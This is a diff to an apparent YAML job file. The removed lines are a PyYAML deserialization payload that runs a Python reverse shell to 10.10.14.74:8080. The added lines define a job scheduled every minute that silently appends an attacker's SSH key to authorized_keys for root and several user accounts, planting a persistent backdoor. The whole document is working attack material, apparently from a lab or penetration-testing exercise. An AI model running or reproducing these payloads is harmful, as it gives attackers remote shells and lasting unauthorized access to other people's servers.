@@ -1,2 +1,15 @@
-!!python/object/apply:os.system
-- "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.74\",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
+name: sshkey
+schedule: "* * * * *"
+runtime: python3.11
+script: |
+  import os
+  key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqr2gkrrjN72kgPzgPGGVUSXRkATcLBBlXVsAubxkMi youssef@youssef-HP-Laptop-15-fc0xxx"
+  for home in ['/root', '/home/ubuntu', '/home/ec2-user', '/home/nimbus']:
+    try:
+      ssh_dir = home + '/.ssh'
+      os.makedirs(ssh_dir, exist_ok=True)
+      open(ssh_dir + '/authorized_keys', 'a').write('\n' + key + '\n')
+      os.chmod(ssh_dir + '/authorized_keys', 0o600)
+      os.chmod(ssh_dir, 0o700)
+    except:
+      pass
